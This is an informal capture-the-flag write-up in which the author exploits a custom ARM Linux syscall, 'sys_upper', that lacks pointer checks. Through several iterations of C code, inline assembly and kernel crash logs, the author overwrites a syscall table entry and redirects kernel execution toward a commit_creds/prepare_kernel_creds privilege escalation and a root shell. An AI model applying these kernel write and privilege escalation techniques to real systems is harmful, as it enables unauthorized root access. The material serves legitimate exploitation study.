>I made a new system call for Linux kernel.
>It converts lowercase letters to upper case letters.
>would you like to see the implementation?

# understanding the challenge
we get a new system call called `sys_upper` which writes the bytes from `in` to `out` 
and if it encounters a lowercase letter it converts it to uppercase. Moreover it copies `strlen(in)` bytes, meaning the exploit payload cannot contain null character.

when initialing the kernel module the `sys_upper` pointer is written the the syscall table at 0x8000e348.
in the code `#define SYS_CALL_TABLE      0x8000e348      // manually configure this address!!` 
I'm not sure if they are telling us to configure this address or to configure it... I think it's the real syscall table address, 
because we didn't initialized other handlers.

let's check if I can call it...
running `dmesg` we get `sys_upper(number : 223) is added`
we don't have python on the VM. 

```C
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SYS_UPPER 223
int main(int argc, char *argv[]) {
    if (argc != 2)
        return -1;

    char* out = malloc(strlen(argv[1]));     

    // strcpy(out, argv[1]);
    syscall(SYS_UPPER, argv[1], out);


    printf("in: %s\n", argv[1]);
    printf("out: %s\n", out);
    free(out);
    return 0;
}
```

returned 
```text
in: abc
out: ABC
```

### understanding the privileges
`syscalls` runs in kernel mode. 
I think that only kernel pages could contain `syscalls`, if you think about it when running in kernel mode I can execute userland pages.
to understand better the challenge I'm reading about kernel exploitation see `kernel.md`
## goal
read the flag from `/root/flag` with root privileges.

## vulnerability
The syscall doesn't check which location we read from and which we write to.
We know the location in memory of the syscall table.

## abilities
* I can **read** anything in the syscall memory to `out`
* I can **write** anything to `out`


### Idea
* save the process context
* overwrite `sys_upper` entry in the syscall table to exploit function, assuming there is no SMEP.
* call `prepare_kernel_creds` and `commit_creds`
* `ireq` to userland and to `system(/bin/sh)`

First try to develop the exploit without running it locally with debugger. 
Notice that for running locally you will need to set the syscall table at a fixed location and insert the model.

## analyzing 
If  `sys_upper`  location is **above** the exploit location in memory then we could not overwrite all the bytes inside the entry.
1. let's check it.
2. I can use the linker to determine the location of the executable.
3. I can you a gadget.

```C
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#define SYS_UPPER 223
#define SYS_CALL_TABLE		0x8000e348

void exploit() {
    puts("[+] redirected syscall execution");
    exit(0);
}

int main(int argc, char *argv[]) {
    char *entry = (char *)(SYS_CALL_TABLE + SYS_UPPER);
    char *entry_value = "AAAAAAAA";

    printf("exploit location: %p\n", (void *)exploit);
    // overwrite syscall entry
    syscall(SYS_UPPER, entry_value, entry);
    printf("in: %s\n", entry_value);
    // printf("out: %s\n", entry); could not print kernel pages

    // triger hook
    syscall(SYS_UPPER);
    return 0;
}
```
it crashes in `strlen` from analysis we can understand that this machine is `arm` 32bit.
```
exploit location: 0x8429
in: AAAAAAAA
Unable to handle kernel NULL pointer dereference at virtual address 00000001
pgd = 83ec8000
[00000001] *pgd=65f19831, *pte=00000000, *ppte=00000000
Internal error: Oops: 17 [#1] SMP ARM
Modules linked in: m(PO)
CPU: 0 PID: 546 Comm: sol Tainted: P           O 3.11.4 #13
task: 869763c0 ti: 85702000 task.ti: 85702000
PC is at strlen+0x0/0x2c
LR is at sys_upper+0x10/0x48 [m]
pc : [<80196b58>]    lr : [<7f000010>]    psr: 80000013
sp : 85703f98  ip : 10c53c7d  fp : 00000000
r10: 00000000  r9 : 85702000  r8 : 8000e348
r7 : 000000df  r6 : 00008520  r5 : 00000000  r4 : 00000001
r3 : 7edc4e84  r2 : 00000001  r1 : 00000000  r0 : 00000001
Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
Control: 10c53c7d  Table: 63ec806a  DAC: 00000015
Process sol (pid: 546, stack limit = 0x85702238)
Stack: (0x85703f98 to 0x85704000)
3f80:                                                       7edc4e84 00000001
3fa0: 8000e427 8000e1a0 00000001 8000e427 00000001 00000000 00000001 7edc4e84
3fc0: 00000001 8000e427 00008520 000000df 00000000 00000000 76f51000 00000000
3fe0: 7edc4d20 7edc4d10 00008499 76edc8f0 60000010 00000001 8028f8dd 6300f5c1
[<80196b58>] (strlen+0x0/0x2c) from [<7f000010>] (sys_upper+0x10/0x48 [m])
[<7f000010>] (sys_upper+0x10/0x48 [m]) from [<8000e1a0>] (ret_fast_syscall+0x0/0x30)
Code: e3120020 1afffff9 e12fff1e 8037ba48 (e5d03000)
---[ end trace 10626a2968dc530c ]---
Segmentation fault
```

checked without overwrite and still the same error occurs. Moreover we can learn that `lr` (return address) is the location of `sys_upper` which is `0x7f000010`, so most likely we would have to overwrite 4 bytes... I checked the exploit in parts and found out that `sys_upper` was not overwritten...
```c
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#define SYS_UPPER 223
#define SYS_CALL_TABLE		0x8000e348

void exploit() {
    puts("[+] redirected syscall execution");
    exit(0);
}

int main(int argc, char *argv[]) {
    char *entry = (char *)(SYS_CALL_TABLE + SYS_UPPER);
    char *entry_value = "AAAAAAAA";
    char *in = "this is a test";
    char *test_sys_upper = malloc(strlen(in));

    printf("exploit location: %p\n", (void *)exploit);
    // overwrite syscall
    syscall(SYS_UPPER, entry_value, entry);
    printf("in: %s\n", entry_value);
    // could not print kernel pages
    
    // triger hook
    syscall(SYS_UPPER, in, test_sys_upper);
    printf("in: %s\n", in);
    printf("out: %s\n", test_sys_upper);
    return 0;
}
```
```
exploit location: 0x8489
in: AAAAAAAA
in: this is a test
out: THIS IS A TEST
```

so my idea is to 
1. disable page protection something with `cr0`
2. write to a global location in memory

```C
//Pointers to re-mapped writable pages
unsigned int** sct;
```
This syscall table is writeable :) so I need to access `sct[NR_SYS_UNUSED]`

why does `syscall.c` doesn't do a thing inside the exit model? 
**I can check if I wrote to this memory by reading it to a readable memory**

I didn't index in the right location

```sh
[*] exploit location: 0x8489
in: AAAAAAAA
Unable to handle kernel paging request at virtual address 41414140
pgd = 83528000
[41414140] *pgd=00000000
Internal error: Oops: 80000005 [#1] SMP ARM
Modules linked in: m(PO)
CPU: 0 PID: 545 Comm: sol Tainted: P           O 3.11.4 #13
task: 8695ef00 ti: 81de6000 task.ti: 81de6000
PC is at 0x41414140
LR is at ret_fast_syscall+0x0/0x30
pc : [<41414140>]    lr : [<8000e1a0>]    psr: 80000033
sp : 81de7fa8  ip : 10c53c7d  fp : 00000000
r10: 00000000  r9 : 81de6000  r8 : 8000e348
r7 : 000000df  r6 : 000085c4  r5 : 8000e348  r4 : 00000001
r3 : 7e98ce84  r2 : 00012008  r1 : 00012008  r0 : 000085f4
Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA Thumb  Segment user
Control: 10c53c7d  Table: 6352806a  DAC: 00000015
Process sol (pid: 545, stack limit = 0x81de6238)
Stack: (0x81de7fa8 to 0x81de8000)
7fa0:                   00000001 8000e348 000085f4 00012008 00012008 7e98ce84
7fc0: 00000001 8000e348 000085c4 000000df 00000000 00000000 76f99000 00000000
7fe0: 7e98cd18 7e98cd08 0000851f 76f248f0 60000010 000085f4 61697472 6e692d6c
Code: bad PC value
---[ end trace b8537387ad0c6f95 ]---
Segmentation fault
```
code redirection achieved :) why did we jumped to 0x41414140 and not 0x41414141 ? maybe the address needs to be aligned to 32 bits.

to solve the `strlen` problem (cannot write null bytes) I can 
1. get an empty entry rewrite it and call it 222 is also empty
2. link the function to higher memory
3. jump to a gadget
to solve the alignment problem which by the way must be 8 bytes aligned. I can use 
```c
__attribute__((optimize("align-functions=16")))
```
The alignment didn't worked and the empty entries were full of garbage... 

I was able to to jump to the code address, but for some reason the first byte is subtracted, and we don't jump to the function... 
```
./sol
[*] exploit location: 0x1030179
[*] hook address: 0x1030159
Segmentation fault
```

played with the location of the function and we got code execution redirection `gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol`
```
[*] exploit location: 0x1030189
[*] hook address: 0x1030189
[+] redirected syscall execution
```

```C
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXPLOIT 222
#define SYS_UPPER 223
#define SYS_CALL_TABLE		0x8000e348

void exploit() {
    puts("[+] redirected syscall execution");
    exit(0);
}

int main(int argc, char *argv[]) {
    unsigned int** syscall_table = (unsigned int**)SYS_CALL_TABLE;
    char *entry_value = "\x89\x01\x03\x01";
    int hook_address = 0;
    printf("[*] exploit location: %p\n", (void *)exploit);
    
    // overwrite an empty syscall
    syscall(SYS_UPPER, entry_value, &syscall_table[EXPLOIT]);
    syscall(SYS_UPPER, &syscall_table[EXPLOIT], (char *)&hook_address);
    printf("[*] hook address: %p\n", (int *)hook_address);

    // triger hook
    syscall(EXPLOIT);
    return 0;
}

/* 
gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
*/
```

after redirecting code execution to my code I need to find resources on arm kernel exploitation, here are some links

```
Unable to handle kernel NULL pointer dereference at virtual address 000000e4
pgd = 86954000
[000000e4] *pgd=65e53831, *pte=00000000, *ppte=00000000
Internal error: Oops: 17 [#1] SMP ARM
Modules linked in: m(PO)
CPU: 0 PID: 551 Comm: sol Tainted: P           O 3.11.4 #13
task: 869203c0 ti: 8301a000 task.ti: 8301a000
PC is at do_page_fault+0x40/0x360
LR is at do_DataAbort+0x34/0x9c
pc : [<8001991c>]    lr : [<80008440>]    psr: 00000193
sp : 8301c020  ip : 804c6060  fp : 00000000
r10: 00000000  r9 : 000000e4  r8 : 00000000
r7 : 8301c150  r6 : 000000e4  r5 : 8301c000  r4 : 00000017
r3 : 00000193  r2 : 00000028  r1 : 00000000  r0 : 000000e4
Flags: nzcv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user
```

```c
#include <sys/syscall.h>
#include <linux/kernel.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXPLOIT 222
#define SYS_UPPER 223
#define SYS_CALL_TABLE 0x8000e348

long commit_creds = 0x8003f56c;
long prepare_kernel_creds = 0x8003f924;

SYSCALL_DEFINE2() {
    // printk("[+] redirected syscall execution");
    // volatile keyword idicates that the instuctions has important side-effects.
    asm volatile (
        "eor r0, r0\n"
        "bl prepare_kernel_creds\n"
        "bl commit_creds\n"
    );
    // printk("[+] privileges escaleted");   
    return 0;  
}

int main(int argc, char *argv[]) {
    unsigned int** syscall_table = (unsigned int**)SYS_CALL_TABLE;
    char *entry_value = "\x89\x01\x03\x01";
    int hook_address = 0;
    // printf("[*] exploit location: %p\n", (void *)exploit);
    
    // overwrite an empty syscall
    syscall(SYS_UPPER, entry_value, &syscall_table[EXPLOIT]);
    syscall(SYS_UPPER, &syscall_table[EXPLOIT], (char *)&hook_address);
    printf("[*] hook address: %p\n", (int *)hook_address);

    // triger hook
    // exploit();
    syscall(EXPLOIT);

    system("/bin/sh");
    return 0;
}

/* 
gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
*/
```

removing the puts solved pagefaults... I cannot 
```
[*] hook address: 0x1030189
Unable to handle kernel paging request at virtual address 01039034
pgd = 85964000
[01039034] *pgd=61bb7831, *pte=615d275f, *ppte=615d2c7f
Internal error: Oops: 8000001f [#1] SMP ARM
Modules linked in: m(PO)
CPU: 0 PID: 557 Comm: sol Tainted: P           O 3.11.4 #13
task: 868d72c0 ti: 83016000 task.ti: 83016000
PC is at 0x1039034
LR is at 0x1030195
pc : [<01039034>]    lr : [<01030195>]    psr: 80000033
sp : 83017fa4  ip : 10c53c7d  fp : 00000000
r10: 00000000  r9 : 83016000  r8 : 8000e348
r7 : 83017fa4  r6 : 01030189  r5 : 00000000  r4 : 00000001
r3 : 7ea15e84  r2 : 00000001  r1 : 00000000  r0 : 00000000
Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA Thumb  Segment user
Control: 10c53c7d  Table: 6596406a  DAC: 00000015
Process sol (pid: 557, stack limit = 0x83016238)
Stack: (0x83017fa4 to 0x83018000)
7fa0:          000000de 00000001 00000000 00000001 00000000 00000001 7ea15e84
7fc0: 00000001 00000000 01030189 000000de 00000000 00000000 76f56000 00000000
7fe0: 7ea15d18 7ea15d08 0103020b 76ee18f0 60000010 00000001 d02b296c 9a052000
Code: 0000 0000 f56c 8003 (f924) 8003 
---[ end trace d70b3fabe7278f91 ]---
```

removed the `commit_creds` and I got the error `/bin/sh: can't access tty; job control turned off` so I `cat` the flag instead.
the problem is that I fail to return from `commit_creds` or from `prepare_kernel_creds`.